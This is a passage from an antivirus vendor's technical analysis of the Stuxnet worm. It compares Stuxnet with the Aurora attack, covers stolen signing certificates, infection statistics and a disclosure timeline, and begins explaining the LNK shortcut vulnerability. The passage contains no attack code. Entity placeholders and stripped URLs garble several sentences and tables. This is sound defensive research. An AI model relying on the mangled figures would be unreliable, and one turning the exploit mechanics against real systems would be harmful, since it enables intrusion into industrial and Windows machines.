504.1.6 Exported functions 524.1.7 [ORG] RPC Server [CARDINAL] 564.1.8 Resources 58www.eset.com34.2KERNEL - MODE FUNCTIONALITY [CARDINAL] 584.2.1 MRXCLS.sys 604.2.2 MRXNET.sys [CARDINAL] 644.3STUXNET BOT CONFIGURATION DATA 654.4REMOTE COMMUNICATION PROTOCOL 66CONCLUSION 70APPENDIX A 71APPENDIX B 74APPENDIX C 75APPENDIX D 82APPENDIX E 84www.eset.comPreface4This report is devoted to the analysis of the notorious Stuxnet worm ( Win32 / Stuxnet ) that suddenly attracted the attention of virus researchers [DATE] this [DATE] summer . This report is primarily intended to describe targeted and semi - targeted attacks , and how they are implemented , focusing mainly on the most recent , namely Stuxnet . This attack is , however , compared to the [NORP] Aurora attack , outlining the similarities and differences between the [CARDINAL] two attacks . The paper is structured as follows . In the [ORDINAL] first section we introduce the targeted attacks and their common characteristics and goals . In this section we present comparison of [CARDINAL] two attacks : Stuxnet vs. [PERSON] Aurora . The [ORDINAL] second section contains some general information on [GPE] SCADA ( [ORG] Supervisory [ORG] Control And [ORG] Data [ORG] Acquisition ) systems and PLCs ( Programmable Logic Controllers ) as Stuxnet \u2019s primary targets of . The [ORDINAL] third section covers the distribution of the Stuxnet worm . Here we describe vulnerabilities that it exploits to infect the target machine . The next section describes the implementation of Stuxnet : user- mode and kernel - mode components , [ORG] RPC [ORG] Server and their interconnection . We also describe the remote communication protocol that it uses to communicate with the remote [ORG] C&C.www.eset.com1 [ORG] Introduction5This section contains information on targeted attacks and its characteristics . In particular , we discuss [CARDINAL] two types of attacks : attacks targeting a specific company or organization , and attacks targeting specific software and IT infrastructure . We do this by comparing [CARDINAL] two outstanding examples of these [CARDINAL] two species of attack : [PERSON] Aurora and Stuxnet . This chapter provides information on some intriguing facts related to Stuxnet , such as timestamps of its binaries , and information on compiler versions which might be useful in analysis of the malware . We end with statistics relating to Stuxnet distribution all over the world . Recently , there has been increased public awareness and information about targeted attacks as the number of such attacks has significantly increased , becoming a separate cybercriminal business sector in its own right . Many companies are reluctant to disclose information about attempted or successful targeted attacks for fear of public relations issues affecting their profits , so the information made available to the public only represents a small part of what is actually happening.1.1 [ORG] Targeted [ORG] AttacksAll targeted attacks can be divided into [CARDINAL] two major classes : Targeting a specific company or organization - this type of attack is directed at a specific organization and the aim of an intruder is unauthorized access to confidential information such as commercial secrets ( as with the [PERSON] Aurora attack ) . Targeting specific software or IT infrastructure - this type of attack is not directed at a specific company and its target is the data associated with a certain kind of software , for example -banking client software or [ORG] SCADA systems . Such attacks have to be implemented in a more flexible manner . This class of attacks can do much more damage to a great number of companies than the attacks of the [ORDINAL] first class . As this class pre - supposes a long term attack , it is designed to circumvent protection systems ( as with the Stuxnet attack).The most common vector for the development of targeted external attacks is now considered to be the exploitation of vulnerabilities in popular client - side applications ( browsers , plugins and so on ) . Attackers typically use combinations of multiple steps , which allow them to take root on the client - side . In most cases the [ORDINAL] first stage of the attack employs social engineering to allow an attacker to lure the victim to a favorable environment for the implementation of the next attack phase.www.eset.com6Figure [CARDINAL] 1.1 \u2013 Typical Stages of Client - Side AttackBypassing the security software installed in certain organizations is a crucial objective for most malware . There is a separate cybercriminal business sector devoted to providing the means for malicious software to stay undetected by specific or widely spread antivirus products . Figure [CARDINAL] 1.2 \u2013 [ORG] Custom [ORG] Malware [ORG] ProtectorThis kind of service can extend the life of outdated malware , or extend the time new threats stay undetected . However , the use of such technologies to resist detection by antivirus software can be used as a heuristic for the detection of previously unknown samples . But the converse case also holds true : avoiding using any techniques aimed at bypassing antivirus software and making the program resemble legitimate software more closely can be a way of protecting malware . This is the case with the attack mechanism used by the Stuxnet worm.www.eset.com7The Stuxnet attack constituted a serious threat to trust in software using legal digital signatures . This creates a problem for white - listing , where security software is based on the a priori assumption that a trusted program meets certain conditions and is therefore indeed trustworthy . And what if the program closely resembles legitimate software and even has digital certificates for installed modules published in the name of reputable companies ? All this suggests that targeted attacks could persist much longer over time than we previously imagined . Stuxnet was able to stay undetected for a substantial period where no one saw anything suspicious . The use of a self - launching , [DATE] 0 - [DATE] day vulnerability in the attack allowed the rapid distribution of Stuxnet in the targeted region . The choice of this kind of vulnerability is quite deliberate , because in the absence of information about its existence , use of the exploit will not be detected . All these facts suggest a well - planned attack which remained unnoticed until long after it was launched . But it is precisely the existence of such threats that inspires us to look at the new vector and the possibility of attacks that use it , in order to reduce the impact of future attacks.1.2Stuxnet versus [ORG] AuroraIn [DATE] the [DATE] past [DATE] year , the public has become aware of [CARDINAL] two targeted attacks , codenamed Stuxnet and [PERSON] Aurora . Both of these attacks have some common features that characterize recent trends in targeted attacks . Nowadays , the most popular vector of penetration of the user \u2019s machine is realized through popular client - side applications ( browsers , plugins and other apps ) . It is much easier to steal data by launching an indirect attack on people with access to important information via a malicious web site , than it is to attack the company \u2019s well - protected database server directly . The use of client - side applications as a vector of attack is undoubtedly expected by cautious system users and administrators , but this attack methodology is less predictable and harder to protect against , since in everyday life we use many applications , each of them potentially an attack vector . The [PERSON] Aurora and Stuxnet attacks used [DATE] 0 - [DATE] day exploits to install malicious programs onto the system . Table 1.2.1 presents data on the malicious programs and exploits used : Table 1.2.1 \u2013 Malicious [ORG] Software and [GPE] Exploits Used to Perform AttacksCharacteristicsAuroraStuxnetExploitation vectorMS10 - 002 ( 0 - day)MS10 - 046 ( 0 - day)MS10 - 061 ( 0 - day)MS10 - 073 ( 0 - day)MS10 -092 ( [QUANTITY] 0 - day)CVE-2010 - 2772 ( 0 - day)MS08 - 067 ( patched)Targeted malicious programWin32 / VedrioWin32 / StuxnetTable 1.2.2 displays the characteristics of vulnerable platform and exploits , and indicates how seriously the intruders take their attacks.www.eset.comTable [CARDINAL] 1.2.2 \u2013 Platforms Vulnerable to [DATE] 0 - Day Attack Vector8CharacteristicsMS10 - 002MS10 - 046MS10 - 061MS10 - 073 MS10 -092Vulnerable versionsall versions of [ORG] MS [ORG] Internet [ORG] Explorer ( [CARDINAL] 6 , [CARDINAL] 7,all versions of MS Windows ( WinXP , Vista , all versions of MS Windows ( WinXP , Vista , [ORG] WinXP and Win2000Vista andWin7Layered shellcode8)yesRemote attacksyesOther vectorsno7 , \u2026 ) noyesyes7 , \u2026 ) noyes ( only forWinXP)yesyesnononononoThe exploit ESET detects as JS / Exploit . CVE-2010 - 0249 ( MS10 - 002 ) has a narrower range of possible vectors of distribution than [ORG] LNK / [ORG] Exploit . CVE-2010 - [ORG] 2568 ( MS10 - 046 ) . The range of vulnerabilities used in the Stuxnet attack have other interesting features making use of such infection vectors as removable flash drives and other [ORG] USB devices , and resources shared over the network . The exploit [ORG] LNK / [ORG] Exploit . CVE- [DATE] 2010 - [DATE] 2568 is by its nature so designed that detection of the exploit \u2019s malicious activity is impossible , if you are not aware of its existence . If we compare the features of these [CARDINAL] two exploits , it seems that JS / [ORG] Exploit . CVE-2010 - 0249 is designed for a surprise attack , while in the case of [ORG] LNK / [ORG] Exploit . CVE-2010- [DATE] 2568 a long - term , persistent attack was intended . An additional propagation vector ( MS10 - 061 ) can spread rapidly within the local network . These observations confirm the data from [LAW] Table [LAW] 1.2.3 , which compares the characteristics of the malicious programs used in these attacks.www.eset.comTarget9Table [DATE] 1.2.3 \u2013 Comparison of attacksCharacteristicsAuroraStuxnetTargeted group of specificSites using [ORG] SCADA systems butcompaniespromiscuous disseminationMultiple distribution vectorsnoyesPayloadCode packingCode obfuscationAnti - AV functionalityMasking under legal programsArchitecture of malicious programEstablishing a backdoorDistributed C&CCommunications protocolCustom encryption of communications protocolModules with a legal digital signatureUpdate mechanismUninstall mechanismInfection counterAvailability of any modifications malicious programdownload in process infectingall in [CARDINAL] one malwareyesyesyesyesyesyesyesyesmodularmodularyesyeshttpsyesnononohttpyesyesyes ; downloads and runs thedownloaded module [ORG] viaWinAPIyes ; downloads updates via WinAPI functions and runs them in memory , withoutcreating any [CARDINAL] filesnononoyesyesyesThese [CARDINAL] two attacks have shown us that no information system is absolutely secure and carefully planned targeted or even semi - targeted attacks put a serious weapon into the hands of bad guys . In the case of Stuxnet there are still a lot of open questions , in our report we try to highlight the technical component of this semi - targeted attack . Stuxnet showed us by example how much can be conceived and achieved using massive semi - targeted attacks.www.eset.com10Why semi - targeted ? While the payload is plainly focused on [ORG] SCADA systems , the malware \u2019s propagation is promiscuous . Criminal ( and nation - state funded ) malware developers have generally moved away from the use of self - replicating malware towards [NORP] Trojans spread by other means ( spammed URLs , PDFs and [ORG] Microsoft [ORG] Office documents compromised with [DATE] 0 - [DATE] day exploits , and so on ) . Once self - replicating code is released , it \u2019s difficult to exercise complete control over where it goes , what it does , and how far it spreads ( which is one of the reasons reputable researchers have always been opposed to the use of \u201c good \u201d viruses and worms : for the bad guys , it also has the disadvantage that as malware becomes more prevalent and therefore more visible , its usefulness in terms of payload delivery is depleted by public awareness and the wider availability of protection).As we describe elsewhere in this document , there were probably a number of participants in the Stuxnet development project who may have very different backgrounds . However , some of the code looks as if it originated with a \" regular \" software developer with extensive knowledge of [GPE] SCADA systems and/or [ORG] Siemens control systems , rather than with the criminal gangs responsible for most malcode , or even the freelance hacker groups , sometimes thought to be funded by governments and the military , ( for example [PERSON] Wicked [PERSON] Rose ) we often associate with targeted attacks . However , it \u2019s feasible that what we \u2019re seeing here is the work of a more formally - constituted , multi - disciplinary \u201c tiger team \u201d . Such officially but unpublicized collaborations , resembling the cooperative work with other agencies that anti - malware researchers sometimes engage in , might be more common than we are actually aware . On the other hand , the nature of the .LNK vulnerability means that even though the mechanism is different to the Autorun mechanism exploited by so much malware in [DATE] recent [DATE] years , its use for delivery through [ORG] USB devices , removable media , and network shares , has resulted in wide enough propagation to prevent the malware from remaining \u201c below the radar \u201d . This may signify misjudgement on the part of a development team that nevertheless succeeded in putting together a sophisticated collaborative project , or a miscommunication at some point in the development process . On the other hand , it may simply mean that the group was familiar enough with the modus operandi characteristic of [GPE] SCADA sites to gamble on the likelihood that Stuxnet would hit enough poorly - defended , poorly - patched and poorly- regulated PLCs to gain them the information and control they wanted . Since at the time of writing it has been reported by various sources that some [CARDINAL] 14 or [CARDINAL] 15 [ORG] SCADA sites have been directly affected by the infection of PLCs ( Programmable Logic Controllers ) , the latter proposition may have some validity . While the use of these vectors has increased the visibility of the threat , it \u2019s likely that it has also enabled access to sites where \u201c air - gapped \u201d generic defences were prioritized over automated technical defences like anti - virus , and less automated system updating and patching . This is not a minor consideration , since the withdrawal of support from Windows versions earlier than Windows XP SP3 . At the same time , it \u2019s clear that there are difficulties for some sites where protective measures may involve taking critical systems offline . While there are obvious concerns here concerning SPoFs ( single points of failure ) , the potential problems associated with fixing such issues retrospectively should not be underestimated.www.eset.comStuxnet Revealed1.311During our research , we have been constantly finding evidence confirming that the Stuxnet attack was carefully prepared . Timestamp in the file ~wtr4141.tmp indicates that the date of compilation was 03/02/2010.Figure [CARDINAL] 1.3 \u2013 Header Information from ~wtr4141.tmpVersion [CARDINAL] 9.0 of the linker indicated that attackers used MS Visual Studio 2008 for developing Stuxnet 's components . File ~wtr4141.tmp is digitally signed , and the timestamp indicates that the signature on the date of signing coincides with the time of compilation . Figure [CARDINAL] 1.4 \u2013 Digital Signature Information from ~wtr4141.tmpExamination of the driver is even more interesting , since the timestamp of [NORP] MRXCLS.sys indicates that it was compiled on [DATE] 01/01/2009 . An [CARDINAL] 8.0 version of the linker used to build it suggests that MS Visual Studio [DATE] 2005 was for development . Using different versions of the linker may indicate as well that this project was developed by a group of people with a clear division of responsibilities.www.eset.com12Figure [CARDINAL] 1.5 \u2013 [PRODUCT] Header information from MRXCLS.sysThe digital signature shows a later date 25/01/2010 , indicating that this module , was available very early on , or was borrowed from another project . Figure [CARDINAL] 1.6 \u2013 Digital Signature Information from MRXCLS.sysThe [ORDINAL] second driver was built later and a timestamp of compilation shows [DATE] 25/01/2010 , coinciding with the date of signature of the driver [NORP] MRXCLS.sys . The same linker version was used and maybe these [CARDINAL] two drivers were created by one and the same person . Figure [CARDINAL] 1.7 \u2013 Header Information from MRXNET.sysThe timestamp signature also coincides , and it all seems to point to the date of release for this component.www.eset.com13Figure [CARDINAL] 1.8 \u2013 Digital Signature Information from [DATE] MRXNET.sysOn [DATE] July [DATE] 17th , ESET identified a new driver named jmidebs.sys , compiled on [DATE] July [DATE] 14th [DATE] 2010 , and signed with a certificate from a company called \" [ORG] JMicron [ORG] Technology [ORG] Corp \" . This is different from the previous drivers which were signed with the certificate from [ORG] Realtek [ORG] Semiconductor [ORG] Corp. It is interesting to note that both companies whose code signing certificates were used have offices in [GPE] Hsinchu [GPE] Science [GPE] Park , [GPE] Taiwan . The physical proximity of the [CARDINAL] two companies may suggest physical theft , but it 's also been suggested that the certificates may have been bought from another source . For instance , the [PERSON] Zeus botnet is known to steal certificates , though it probably focuses on banking certificates . ( As [PERSON] Randy [PERSON] Abrams pointed out : url file jmidebs.sys functions in much the same way as the earlier system drivers , injecting code into processes running on an infected machine . As Pierre - Marc [PERSON] Bureau pointed out in a blog at the time , it was n't clear whether the attackers changed their certificate because the [ORDINAL] first one was exposed , or were simply using different certificates for different attacks . Either way , they obviously have significant resources to draw on . The well - planned modular architecture that characterizes the Stuxnet malware , and the large number of modules used , suggests the involvement of a fairly large and well - organized group . ( See : url [CARDINAL] 1.9 \u2013 [ORG] Certificate [ORG] Issued to [ORG] JMicron [ORG] Technology [ORG] CorporationAnother interesting finding was the string b:\\myrtus\\src\\objfre_w2k_x86\\i386\\guava.pdb found in the resource section.www.eset.com14Figure [CARDINAL] 1.10 \u2013 Interesting String in MRXNET.sysThe number of modules included in Stuxnet and the bulkiness of the developed code indicate that this malicious program was developed by a large group of people . Stuxnet is a more mature and technologically advanced ( semi-)targeted attack than Aurora.www.eset.comStatistics on [WORK_OF_ART] the [WORK_OF_ART] Spread [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Stuxnet [WORK_OF_ART] Worm1.415The statistical distribution of infected machines Win32 / Stuxnet globally , from the beginning of the detection to [DATE] the [DATE] end [DATE] of [DATE] September , is presented in the figure below : Figure [CARDINAL] 1.11 \u2013 Global infection by Win32 / Stuxnet ( Top [CARDINAL] 14 Countries)Asian countries are the leaders with the largest number of Stuxnet - infected machines by . [GPE] Iran is the region where the widest spread Stuxnet has been seen . If we look at the percentage distribution of the number of infections by region , we can generate the following table : Table 1.4.1 \u2013 [ORG] The [ORG] Percentage [ORG] Distribution [ORG] of [ORG] Infections by [DATE] RegionIranIndonesiaIndiaPakistan [GPE] UzbekistanRussiaKazakhstanBelarus52,2%17,4%11,3%3,6%2,6%2,1%1,3%1,1%Kyrgyzstan Azerbaijan United StatesCubaTajikistanAfghanistanRest of the world1,0%0,7%0,6%0,6%0,5%0,3%4,6%A high volume of detections in a single region may mean that it is the major target of attackers . However , multiple targets may exist , and the promiscuous nature of the infective mechanism is likely to targeting detail . In fact , even known infection of a [GPE] SCADA site is n\u2019t incontrovertible evidence that the site was specifically targeted . It has been suggested that malware could have been spread via flash drives distributed at a [NORP] SCADA conference or event ( as [PERSON] Randy [PERSON] Abrams pointed out in a blog atwww.eset.com16url Even that would argue targeting of the sector rather than individual sites , and that targeting is obvious from the payload . Distribution , however , is influenced by a number of factors apart from targeting , such as local availability of security software and adherence to good update / patching practice . Furthermore , our statistics show that the distribution of infections from [DATE] the [DATE] earliest [DATE] days of detection shows a steep decline even in heavily - affected [GPE] Iran in [DATE] the [DATE] days following the initial discovery of the attack , followed by a more gradual decline over subsequent [DATE] months . However , the sparse information we have about actual infection of [ORG] SCADA sites using ( and affecting ) [ORG] Siemens software suggests that [CARDINAL] about [CARDINAL] a [CARDINAL] third of the sites affected are in the [NORP] German process industry sector . [ORG] Siemens have not reported finding any active instances of the worm : in other words , it has checked out PLCs at these sites , but it has n\u2019t attempted to manipulate them . [PERSON] Heise observes [PERSON] that:\u201cThe worm seems to look for specific types of systems to manipulate . [ORG] Siemens could n't provide any details about which systems precisely are or could be affected . \u201d(url [CARDINAL] 1081469.html)Comprehensive analysis of how Stuxnet behaves when it hits a vulnerable installation was published by [PERSON] Ralph [PERSON] Langner , ahead of the ACS conference in [GPE] Rockville in [DATE] September [DATE] 2010.However , the Langner analysis is contradicted in some crucial respects by analysis from other sources ( url There was also some fascinating conjecture on display in an interview with [PERSON] Joe [PERSON] Weiss.(url ( Joseph ) [ORG] Weiss is , incidentally , the author of \u201c [ORG] Protecting [ORG] Industrial [ORG] Control [ORG] Systems from Electronic Threats \u201d , [ORG] ISBN : [CARDINAL] 978 - 1 - 60650 - 197 - 9 , which sounds well worth investigating for a closer look at industrial control systems ( [ORG] ICS ) and security . The [ORG] Amazon page url [ORG] Control - [ORG] Systems - Electronic / dp/1606501976 includes pointers to some other books on related topics as well as some very positive commentary on [ORG] Joe \u2019s book.www.eset.com172 [ORG] Microsoft , [ORG] Malware and the MediaThis section contains information on events that have taken place since the original outbreak of the Stuxnet malware . While a full - scale account of the media coverage around these events would be a long document in its own right , we present here a partial timeline which puts some of the most significant events in chronological order , ranging from initial detection on [DATE] 17th [DATE] of [DATE] June until the date of release of this [ORG] Revision . This section also contains a table ( Table 2.2.1 ) that details posts on Stuxnet in ESET \u2019s blog . A number of other links are also given non - chronologically so that the reader can track other resources covering various topics related to Stuxnet . While Stuxnet exploits several Windows vulnerabilities , [CARDINAL] at [CARDINAL] least [CARDINAL] four of them described as [DATE] 0 - [DATE] day : MS08 - 067 [ORG] RPC [ORG] Exploit ( url LNK Exploit ( url [ORG] Spool [ORG] Server Exploit(url privilege escalation ( or Elevation of Privilege ) vulnerabilities :o MS10 - 073 [PRODUCT] Win32k.sys Exploit(url MS10 - 092 [PRODUCT] Task [PRODUCT] Scheduler Exploit(url it also targets PLCs ( [ORG] Programming [ORG] Logic [ORG] Controllers ) on sites using [ORG] Siemens [ORG] SIMATIC WinCC or STEP [CARDINAL] 7 [ORG] SCADA ( [ORG] Supervisory [ORG] Control And [ORG] Data [ORG] Acquisition ) [GPE] systems.2.1SCADA , [ORG] Siemens and StuxnetThis attack makes additional use of a further vulnerability categorized as CVE-2010 - 2772 , relating to the use of a hard - coded password in those systems allowing a local user to access a back - end database and gain privileged access to the system . This meant not only that the password was exposed to an attacker through reverse engineering , but , in this case , that the system would not continue to work if the password was changed , though that issue was not mentioned in [ORG] Siemens \u2019 advice to its customers at url [ORG] Industrial [ORG] Controls [ORG] Engineer [PERSON] Jake [PERSON] Brodsky made some very pertinent comments to [PERSON] David [PERSON] Harley \u2019s blog at url agreeing that strategically , [ORG] Siemens were misguided to keep hardcoding the same access account and password into the products in question , and naive in expecting those details to stay secret , [PERSON] Jake pointed out , perfectly reasonably , that tactically , it would be impractical for many sites to take appropriate remedial measures without a great deal of preparation , recognizing that a critical system ca n\u2019t be taken down without implementing interim maintenance measures . He suggested , therefore , www.eset.com18that isolation of affected systems from the network was likely to be a better short - term measure , combined with the interim measures suggested by [ORG] Microsoft for working around the .LNK and .PIF issues that were causing concern at the time ( url Timeline2.219VirusBlokAda reportedly detected Stuxnet components as Trojan - Spy.0485 and Malware- Cryptor.Win32.Inject.gen on [DATE] 17th [DATE] June [DATE] 2010 ( url and also described the .LNK vulnerability on which most of the subsequent attention was focused . However , it seems that [ORG] Microsoft , like most of the security industry , only became aware ( or publicly acknowledged ) the problem in [DATE] July . ( See : url security - bulletin - release.aspx)Realtek Semiconductor were notified of the theft of their digital signature keys on [DATE] 24th [DATE] June [DATE] 2010 . ( url was already detecting some components of the attack generically early in [DATE] July [DATE] 2010 , but the magnitude of the problem only started to become obvious [DATE] later [DATE] that [DATE] month . [ORG] Siemens do n\u2019t seem to have been notified ( or at any rate acknowledged receipt of notification ) until [DATE] 14th [DATE] July [DATE] 2010 . url s / [ORG] Industrial / Pages / WinCC_Update.aspx . On [DATE] the [DATE] same [DATE] day , another driver was compiled as subsequently revealed by ESET analysis and reported on [DATE] 19th [DATE] July : url signed - binariesOn [DATE] the [DATE] 15th [DATE] July , [PERSON] Brian [PERSON] Krebs was , as usual , ahead of the pack at url in pointing out that there was a control systems issue . Advisories were posted by US - CERT and [ORG] ICS - CERT ( url url [CARDINAL] 01%20-%20USB%20Malware%20Targeting%20Siemens%20Control%20Software.pdf.)A [ORG] Microsoft advisory was posted on [DATE] 16th [DATE] July ( url supplemented by a [ORG] Technet blog ( url [WORK_OF_ART] The [WORK_OF_ART] Internet [WORK_OF_ART] Storm [WORK_OF_ART] Center also commented : url See also MITRE Common Vulnerabilities and Exposures ( [ORG] CVE ) # CVE-2010 - [CARDINAL] 2568 url [PERSON] bin / cvename.cgi?name = CVE-2010 - 2568Microsoft Security Advisory # 2286198 Workaround : url url url url the 17th July , the Verisign certificate assigned to [ORG] Realtek [ORG] Semiconductor was revoked ( url However , the [ORDINAL] second driver , now using a [ORG] JMicron certificate was identified : url The [ORDINAL] first of a comprehensive series of ESET blogs was posted.www.eset.com20Table [CARDINAL] 2.2.1 \u2013 Stuxnet - Related Blogs by ESETDateJuly 17July 19July 19July 19July 20July 22July 22July [CARDINAL] 22July 22July 23July 27August 2August 4August [CARDINAL] 25Article(Windows ) Shellshocked , Or Why Win32 / Stuxnet Sux \u2026 Win32 / Stuxnet Signed [ORG] BinariesYet more on Win32 / StuxnetIt Was n\u2019t an ArmyThere \u2019s Passwording and there \u2019s SecurityA few facts about Win32 / Stuxnet & CVE-2010 - 2568Why [ORG] Steal [ORG] Digital Certificates?New malicious LNKs : here we go \u2026 Win32 / Stuxnet : more news and resourcesLink [GPE] Exploits and the Search for a [ORG] Better [ORG] ExplorerMore [ORG] LNK exploiting malware , by Jove!*Save Your Work ! [ORG] Microsoft [ORG] Releases [ORG] Critical Security PatchAssessing Intent21st Century Hunter - Killer UAV Enters Restricted DC Airspace \u2013 Skynet Alive?September 10New Papers and ArticlesSeptember 27Iran Admits Stuxnet Infected Its Nuclear Power PlantSeptember 28thYet more StuxnetSeptember 30thFrom sci - fi to Stuxnet : exploding gas pipelines and the Farewell DossierSeptember 30thWho Wants a Cyberwar?October 13thStuxnet the InscrutableOctober 13thA Little Light ReadingOctober 14thStuxnet : Cyberwarfare \u2019s Universal Adaptor?October 15thStuxnet Paper RevisionOctober 15thStuxnet Vulnerabilities for the Non - GeekOctober 15thWin32k.sys : A Patched Stuxnet ExploitOctober 20thStuxnet Under the Microscope : Revision [CARDINAL] 1.11November 2ndNovember 12thNovember 13thNovember 19thStuxnet Paper UpdatedOctober ThreatSense ReportStuxnet Unravelled \u2026 Stuxnet Splits the Atomwww.eset.comNovember 25thDecember 15th21Stuxnet Code : [ORG] Chicken [ORG] Licken or [PERSON] Chicken Run?MS10 - 092 and [GPE] StuxnetOn the [DATE] 19th SANS posted an advisory regarding the .LNK vulnerability ( url and on [DATE] the [DATE] 19th [DATE] and [DATE] 20th [DATE] July [ORG] Siemens updated its posts : url labs were now seeing low - grade Autorun worms , written in [PERSON] Visual [PERSON] Basic , experimenting with the .LNK vulnerability , and had added generic detection of the exploit ( [ORG] LNK / [ORG] Exploit . CVE-2010 - [DATE] 2568 ) . Most AV companies had Stuxnet - specific detection by now , of course . Some of the malware using the same vulnerability that appeared around that time was described by [PERSON] David [PERSON] Harley in a Virus Bulletin article , \u201c [WORK_OF_ART] Chim [WORK_OF_ART] Chymine : [WORK_OF_ART] a [WORK_OF_ART] Lucky [WORK_OF_ART] Sweep ? \u201d published in [DATE] September 2010.The Internet Storm Center raised its [NORP] Infocon level to yellow in order to raise awareness of the issue ( url [ORG] Softpedia and [ORG] Computerworld , among others , noted the publication of exploit code using the .LNK vulnerability . Wired magazine reported that it was well - known that some [ORG] Siemens products made use of hard - coded passwords , as described above : url has made quite a few advisories available , but has not really addressed the hard - coded password issue directly , and some pages appear to have been withdrawn at the time of writing . The following pages were still available : url [CARDINAL] 783&objAction = csOpen&nodeid0=10805449&lang = en&siteid = cseus&aktprim=0&extranet = stan dard&viewreg = WWA number of new malware families were identified using same vulnerability in [DATE] late [DATE] July , and a number of other families such as Win32 / [ORG] Sality generated new variants that also used it . Win32 / [ORG] TrojanDownloader . [PERSON] Chymine . A downloads Win32 / Spy . Agent . NSO keylogger ; Win32 / Autorun . VB.RP , and is similar to malware described by [ORG] ISC on [DATE] 21st [DATE] July ( url ) , but updated to include the CVE-2010 - 2568 exploit for propagation . Pierre - Marc [PERSON] Bureau and [PERSON] David [PERSON] Harley blogged on the subject at url malicious - lnks - here - we - go , and [ORG] Harley explored the issues further in \u201c [WORK_OF_ART] Shortcuts [WORK_OF_ART] to Insecurity : .LNK Exploits \u201d at url and \u201c [WORK_OF_ART] Chim [WORK_OF_ART] Chymine : a lucky sweep ? \u201d in the [DATE] September issue of Virus Bulletin . [PERSON] Aryeh Goretsky \u2019s blog at url security - patch comments on the [ORG] Microsoft patch which finally appeared at [DATE] the [DATE] beginning [DATE] of [DATE] August : see url [ORG] Microsoft issues were addressed in [DATE] September , as described in this document . See also url patch - tuesday / article/178911/?DCMP = [ORG] EMC - SCUK_Newswire . [ORG] Microsoft released a security update to address [ORG] the [ORG] Print [ORG] Spooler [ORG] Service vulnerability used by Stuxnet . The vulnerability only exists where a printer is shared , which is not a default.url url url fixes promised for [CARDINAL] two Elevation of Privilege vulnerabilities . [PERSON] Ralph [PERSON] Langner \u2019s analysis of how Stuxnet affects a vulnerable installation was further discussed at the [ORG] ACS conference in [DATE] September [DATE] 2010 , but AV industry analysis did not fully concur.url url url url last - minute presentations at Virus Bulletin [DATE] 2010 : url url url url of the earlier controversy about the origin and targeting of Stuxnet derived from uncertainty about exactly what its code was meant to do . Even after it was established that it was intended to modify [ORG] PLC ( Programmable Logic Controller ) code , details of the kind of installation targeted remained unclear . However , research into this aspect of the Stuxnet code by Symantec et al , blogged by [PERSON] Eric [PERSON] Chien at url told us that \" Stuxnet requires the industrial control system to have frequency converter drives from [CARDINAL] at [CARDINAL] least [CARDINAL] one of [CARDINAL] two specific vendors , [CARDINAL] one headquartered in [GPE] Finland and the other in [GPE] Tehran , [GPE] Iran . This is in addition to the previous requirements we discussed of a S7 - 300 CPU and a CP-342 - [CARDINAL] 5 [ORG] Profibus communications module . \" He goes on to describe in some detail the workings of the relevant Stuxnet code . [ORG] Symantec 's hefty Stuxnet dossier was updated accordingly . This did n\u2019t put a complete end to the speculation , of course . In fact , some of the speculation actually grew wilder . Most notably , [ORG] Sky [ORG] News , tired of mere factual reporting and even [CARDINAL] half - informed speculation , took off for planet [GPE] Fantasy , where it discovered that the [WORK_OF_ART] Sky really is falling , claiming that the \u201c super virus \u201d is being traded on the black market and \u201c could be used by terrorists \u201d . That , we suppose , would be the bad guys as opposed to the saintly individuals who originally put Stuxnet together , very possibly to attack nuclear facilities.www.eset.com23Our view is that , given the amount of detailed analysis that \u2019s already available , anyone with malicious intent and a smidgen of technical skill would not need the original code . There is certainly substantial evidence suggesting that equipment used for uranium enrichment in nuclear facilities , perhaps in [GPE] Iran , was the original target . However , [PERSON] Will [PERSON] Gilpin , apparently an IT security consultant to the [GPE] UK government , suggested that possession of \u201c the virus \u201d in whatever form has alarming potential:\u201cYou could shut down the police [PRODUCT] 999 system . \u201c You could shut down hospital systems and equipment . \u201d \u201c You could shut down power stations , you could shut down the transport network across [GPE] theUnited [GPE] Kingdom . [NORP] \u201dThese assertions clearly owed little to the [ORG] PLC code actually discussed in the competent analyses above . While it might be possible to do all these things , that would require extensive re - engineering of the existing code and possibly a completely new set of [DATE] 0 - [DATE] days . While it \u2019s by no means all - inclusive , the timeline at url timeline.txt is pretty comprehensive . The Langner team at url finished [DATE] the [DATE] year [DATE] 2010 with a blog summarizing the \u201c up - to - date bottom line \u201d on their view of Stuxnet . Of course , they had published a steady stream of interesting and relevant blogs at url before that , some of which have been listed in this document . As of version [CARDINAL] 1.31 of this document , we will not be publishing further revisions except to correct errors or to introduce substantial new or modified material . We will , however , be adding links from time to time to the ESET blog entry at url this section we present information about the ways in which Stuxnet self - propagates . We pay close attention to the vulnerabilities used by the worm to propagate itself and describe it in details in this section . The reader can find comprehensive information here on the [ORG] LNK vulnerability and its implementation in Stuxnet as well as on the MS10 - 061 vulnerability in [FAC] the [FAC] Windows [FAC] Spooler , both of which are used to deliver and execute the malware \u2019s binaries on a remote machine . We also describe vulnerabilities in win32k.sys driver and [ORG] Windows [ORG] Task [ORG] Scheduler [ORG] Service implementation used to elevate Stuxnet \u2019s privileges up to SYSTEM level . There are [CARDINAL] four ways the rootkit can distribute itself : by means of flash drives , through network shares , through an [ORG] RPC vulnerability and through the recently patched MS10 - 061 [PRODUCT] Print [PRODUCT] Spooler vulnerability . The figure below depicts the vulnerabilities used for propagation and installation . Figure [CARDINAL] 3.1 \u2013 Stuxnet Propagation and Installation Vectors3.1 The LNK exploitMicrosoft Security Advisory ( 2286198 ) CVE-2010 - [DATE] 2568 includes links to detailed information about this exploit . url ESET allocated a separate detection family [ORG] LNK / Autostart for the detection of attacks using this vulnerability . This vulnerabilitywww.eset.com25was known to be in the wild for over a month even after it was identified before [ORG] Microsoft were able to release a patch for it in [DATE] late [DATE] August [DATE] 2010 , as described in the following bulletin : url vulnerability is not based on a standard means of exploitation , where you would expect to need to prepare exploit with shellcode , which would make use of the vulnerability . In fact any .LNK file can exploit it , at exploitation CVE-2010 - 2568 is used feature .LNK files , when displayed in windows explorer and the icon for a .LNK file is loaded from a [ORG] CPL file ( [ORG] Windows [ORG] Control [ORG] Panel file ) . Actually , the [ORG] CPL file represents a conventional dynamic link library and this is the crux of the vulnerability . The role of the payload module will be indicated in the path to the [ORG] CPL file . Figure [CARDINAL] 3.2 \u2013 Information about CPL FileSo below we can see the general scheme of the Shell Link ( . LNK ) [PERSON] Binary [PERSON] File [PERSON] Format ( url [CARDINAL] 3.3 \u2013 Scheme of Shell Link ( .LNK ) [PERSON] Binary [PERSON] File Formatwww.eset.com26The most interesting feature here 